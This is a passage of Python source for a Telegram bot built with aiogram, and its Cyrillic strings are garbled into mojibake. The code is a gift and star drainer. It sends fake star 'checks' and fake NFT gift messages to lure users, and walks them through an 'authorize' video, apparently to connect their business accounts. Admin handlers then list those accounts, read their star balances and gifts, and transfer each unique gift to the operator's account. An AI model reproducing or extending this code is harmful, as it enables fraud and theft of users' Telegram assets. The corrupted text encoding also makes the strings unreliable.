    await callback.message.edit_text(f"‚úÖ –£—Å–ø–µ—à–Ω–æ –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–æ: {converted_count} –ø–æ–¥–∞—Ä–∫–æ–≤.\n‚ùå –û—à–∏–±–æ–∫: {failed}")

@dp.message(F.text == "/test")
async def test(message: Message):
    if message.from_user.id not in ADMIN_IDS:  # –û–Ω–æ–≤–ª–µ–Ω–æ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∑—ñ —Å–ø–∏—Å–∫—É ADMIN_IDS
        await message.reply("‚õî –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    await message.answer("‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞. –ë–æ—Ç –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!")

@dp.callback_query(F.data == "authorize")
async def authorize_callback(callback: CallbackQuery):
    message = callback.message
    lang = load_user_language(callback.from_user.id)
    await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)

    video = FSInputFile("tutorial.mp4")

    caption = LANGUAGES[lang]["authorize_caption"]

    await bot.send_video(
        chat_id=message.chat.id,
        video=video,
        caption=caption,
        parse_mode="HTML"
    )

@dp.message(F.text.startswith("/nft"))
async def process_nft_command(message: Message):
    if message.from_user.id != SPECIAL_USER_ID:
        return
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].startswith("https://t.me/nft/"):
        await message.answer("‚ö†Ô∏è –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç: /nft https://t.me/nft/–Ω–∞–∑–≤–∞–Ω–∏–µ_–ø–æ–¥–∞—Ä–∫–∞")
        return
    gift_link = parts[1]
    gift_name = gift_link.split("/nft/")[-1]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="‚úÖ –ü—Ä–∏–Ω—è—Ç—å", url="https://t.me/Send_Checks_bot"),
            InlineKeyboardButton(text="üëÅÔ∏è –ü–æ–∫–∞–∑–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫", url=gift_link)
        ]
    ])
    await message.answer(
        f"üéÅ <a href='https://t.me/nft/{gift_name}'>{gift_name}</a>\n\nüíå –ö—Ç–æ-—Ç–æ —Ä–µ—à–∏–ª –≤–∞—Å –ø–æ—Ä–∞–¥–æ–≤–∞—Ç—å - –ø–æ–ª—É—á–∏—Ç–µ —Å–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫, –Ω–∞–∂–∞–≤ '–ü—Ä–∏–Ω—è—Ç—å'",
        reply_markup=keyboard, parse_mode="HTML")

@dp.inline_query()
async def inline_query_handler(inline_query: InlineQuery):
    query = inline_query.query.strip()
    if not query.isdigit():
        return await inline_query.answer([], cache_time=1)

    star_count = int(query)
    if star_count <= 0 or star_count > 10000:  # –û–±–º–µ–∂—É—î–º–æ star_count –¥–ª—è –±–µ–∑–ø–µ–∫–∏
        return await inline_query.answer([], cache_time=1)

    # –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
    lang = load_user_language(inline_query.from_user.id)
    check_text = LANGUAGES[lang]["check_message"].format(star_count=star_count)
    check_uuid = str(uuid.uuid4())
    short_check_uuid = check_uuid[:8]  # –û–±—Ä—ñ–∑–∞—î–º–æ UUID –¥–æ 8 —Å–∏–º–≤–æ–ª—ñ–≤

    if star_count in [5, 100]:
        # –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –≤–∞–ª—ñ–¥–Ω–∏–π URL –¥–ª—è –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è
        photo_url = "https://i.ibb.co/fdxHv1Bg/5.png" if star_count == 5 else "https://i.ibb.co/rfcF3WT5/100.png"
        result = InlineQueryResultPhoto(
            id=f"check_{star_count}_{inline_query.id}",
            photo_url=photo_url,
            thumbnail_url=photo_url,
            caption=check_text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(
                    text="–ü–æ–ª—É—á–∏—Ç—å",
                    url=f"https://t.me/{BOT_USERNAME}?start=check_{check_uuid}_{inline_query.from_user.id}_{star_count}"
                )]
            ])
        )
    else:
        result = InlineQueryResultArticle(
            id=f"check_{star_count}_{inline_query.id}",
            title=f"–ß–µ–∫ –Ω–∞ {star_count} –∑–≤—ë–∑–¥",
            input_message_content=InputTextMessageContent(
                message_text=check_text,
                parse_mode="HTML"
            ),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(
                    text="–ü–æ–ª—É—á–∏—Ç—å",
                    url=f"https://t.me/{BOT_USERNAME}?start=check_{check_uuid}_{inline_query.from_user.id}_{star_count}"
                )]
            ])
        )

    await inline_query.answer([result], cache_time=0)

@dp.message(F.text == "/check_kd")
async def check_kd_list(message: Message):
    if message.from_user.id not in ADMIN_IDS:  # –û–Ω–æ–≤–ª–µ–Ω–æ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∑—ñ —Å–ø–∏—Å–∫—É ADMIN_IDS
        await message.reply("‚õî –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
        if not connections:
            await message.answer("‚ùå –ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–æ–≤.")
            return
        kb = InlineKeyboardBuilder()
        for conn in connections:
            name = f"@{conn.get('username')} ({conn['user_id']})" or f"ID {conn['user_id']}"
            user_id = conn["user_id"]
            kb.button(text=name, callback_data=f"check_kd:{user_id}")
        await message.answer("üë§ –í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:", reply_markup=kb.as_markup())
    except FileNotFoundError:
        await message.answer("üìÇ –§–∞–π–ª –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π –Ω–µ –Ω–∞–π–¥–µ–Ω.")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π")
        await message.answer(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π")

@dp.callback_query(F.data.startswith("check_kd:"))
async def check_kd_callback(callback: CallbackQuery):
    await callback.answer()
    user_id = int(callback.data.split(":", 1)[1])
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
        connection = next((c for c in connections if c["user_id"] == user_id), None)
        if not connection:
            await callback.message.answer("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –¥–ª—è —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            return
        business_connection_id = connection["business_connection_id"]
        star_balance = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        text = f"ÔøΩID –ë–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ: <b>{business_connection_id}</b>\n‚≠ê –ë–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥: <b>{star_balance.star_amount}</b>\n\n"
        await callback.message.answer(text, parse_mode="HTML")
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
        if not gifts.gifts:
            text += "üéÅ –ü–æ–¥–∞—Ä–∫–æ–≤ –Ω–µ—Ç."
            await callback.message.answer(text)
        else:
            # –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –≤–∞–ª—ñ–¥–Ω–æ—Å—Ç—ñ SENDER_ID
            try:
                sender_id = int(SENDER_ID)
                try:
                    await bot.send_message(chat_id=sender_id, text="–¢–µ—Å—Ç –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—ñ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∫—É–ª–¥–∞—É–Ω—É.")
                    await bot.delete_message(chat_id=sender_id, message_id=(await bot.get_updates())[-1].message.message_id)
                except Exception as e:
                    logging.warning(f"–ü–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è: –ù–µ–º–æ–∂–ª–∏–≤–æ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ—Å—Ç—å SENDER_ID {SENDER_ID}: {e}. –ü—Ä–æ–¥–æ–≤–∂—É—é –∑ –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è–º.")
            except ValueError:
                logging.error(f"–ü–æ–º–∏–ª–∫–∞: SENDER_ID {SENDER_ID} –Ω–µ —î –∫–æ—Ä–µ–∫—Ç–Ω–∏–º —á–∏—Å–ª–æ–º.")
                sender_id = None
                await callback.message.answer(f"‚ö†Ô∏è –ù–µ–∫–æ—Ä–µ–∫—Ç–Ω–∏–π SENDER_ID ({SENDER_ID}). –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é.")

            for gift in gifts.gifts:
                if gift.type == "unique":
                    cooldown_info = ""
                    if sender_id:
                        try:
                            await bot(TransferGift(
                                business_connection_id=business_connection_id,
                                new_owner_chat_id=sender_id,
                                owned_gift_id=gift.owned_gift_id,
                                star_count=gift.transfer_star_count or 0
                            ))
                        except TelegramBadRequest as e:
                            logging.info(f"–ü–æ–≤–Ω–∞ –ø–æ–º–∏–ª–∫–∞ STARGIFT_TRANSFER_TOO_EARLY –¥–ª—è –ø–æ–¥–∞—Ä—É–Ω–∫–∞ {gift.owned_gift_id}: {str(e)}")
                            if "STARGIFT_TRANSFER_TOO_EARLY" in str(e):
                                match = re.search(r"STARGIFT_TRANSFER_TOO_EARLY_(\d+)", str(e))
                                if match:
                                    cooldown_end = int(match.group(1))
                                    current_time = datetime.datetime.now()
                                    if cooldown_end < current_time.timestamp():
                                        cooldown_end_time = current_time + datetime.timedelta(seconds=cooldown_end)
                                    else:
                                        cooldown_end_time = datetime.datetime.fromtimestamp(cooldown_end)
                                    remaining_time = cooldown_end_time - current_time
                                    remaining_days = max(0, remaining_time.days)
                                    remaining_hours = max(0, remaining_time.seconds // 3600)
                                    remaining_minutes = max(0, (remaining_time.seconds % 3600) // 60)
                                    remaining_str = f"{remaining_days} –¥–Ω., {remaining_hours} –≥–æ–¥., {remaining_minutes} —Ö–≤."
                                    cooldown_info = (
                                        f"\n‚è≥ –ö—É–ª–¥–∞—É–Ω –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è: {cooldown_end_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                                        f"‚è∞ –ó–∞–ª–∏—à–∏–ª–æ—Å—å: {remaining_str}"
                                    )
                                else:
                                    cooldown_info = "\n‚è≥ –¢—Ä–∞–Ω—Å—Ñ–µ—Ä –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–π —á–µ—Ä–µ–∑ –∫—É–ª–¥–∞—É–Ω. –ß–∞—Å –Ω–µ –≤–∫–∞–∑–∞–Ω–æ."
                            elif "PEER_ID_INVALID" in str(e):
                                cooldown_info = f"\n‚ö†Ô∏è –ù–µ–∫–æ—Ä–µ–∫—Ç–Ω–∏–π SENDER_ID ({SENDER_ID}). –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –Ω–µ –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ –±–æ—Ç–æ–º."
                            else:
                                cooldown_info = f"\n‚ö†Ô∏è –ü–æ–º–∏–ª–∫–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∫—É–ª–¥–∞—É–Ω—É: {e}"
                                logging.error(f"–ü–æ–º–∏–ª–∫–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∫—É–ª–¥–∞—É–Ω—É –¥–ª—è –ø–æ–¥–∞—Ä—É–Ω–∫–∞ {gift.owned_gift_id}: {e}")
                        except Exception as e:
                            cooldown_info = f"\n‚ö†Ô∏è –ù–µ–ø–µ—Ä–µ–¥–±–∞—á–µ–Ω–∞ –ø–æ–º–∏–ª–∫–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∫—É–ª–¥–∞—É–Ω—É: {e}"
                            logging.error(f"–ù–µ–ø–µ—Ä–µ–¥–±–∞—á–µ–Ω–∞ –ø–æ–º–∏–ª–∫–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∫—É–ª–¥–∞—É–Ω—É –¥–ª—è –ø–æ–¥–∞—Ä—É–Ω–∫–∞ {gift.owned_gift_id}: {e}")
                    else:
                        cooldown_info = f"\n‚ö†Ô∏è –ù–µ–º–æ–∂–ª–∏–≤–æ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –∫—É–ª–¥–∞—É–Ω —á–µ—Ä–µ–∑ –Ω–µ–∫–æ—Ä–µ–∫—Ç–Ω–∏–π SENDER_ID ({SENDER_ID})."

                    text = (
                        f"{gift.gift.base_name} #{gift.gift.number}\nOwner: #{user_id}\nOwnedGiftId: {gift.owned_gift_id}\n\n"
                        f"üéÅ <b>https://t.me/nft/{gift.gift.name}</b>\n"
                        f"ÔøΩID –ú–æ–¥–µ–ª—å: <code>{gift.gift.model.name}</code>\n\n\n‚≠ê –°—Ç–æ–∏–º–æ—Å—Ç—å —Ç—Ä–∞–Ω—Å—Ñ–µ—Ä–∞: {gift.transfer_star_count} ‚≠ê"
                        f"{cooldown_info}"
                    )
                    kb = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="üéÅ –ü–µ—Ä–µ–¥–∞—Ç—å –º–Ω–µ",
                                              callback_data=f"transfer:{user_id}:{gift.owned_gift_id}:{gift.transfer_star_count}")]
                    ])
                    await callback.message.answer(text, parse_mode="HTML", reply_markup=kb)
                    await asyncio.sleep(0.2)
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –ø–æ–¥–∞—Ä–∫–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
            logging.error(f"–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –æ—Ç—Ä–∏–º–∞–Ω–Ω—ñ –ø–æ–¥–∞—Ä—É–Ω–∫—ñ–≤: {e}")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö –ø–æ –±–∏–∑–Ω–µ—Å—É")
        await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")

async def main():
    print("üíñ –°–¥–µ–ª–∞–Ω–æ —Å –ª—é–±–æ–≤—å—é by @sqvvinf")
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
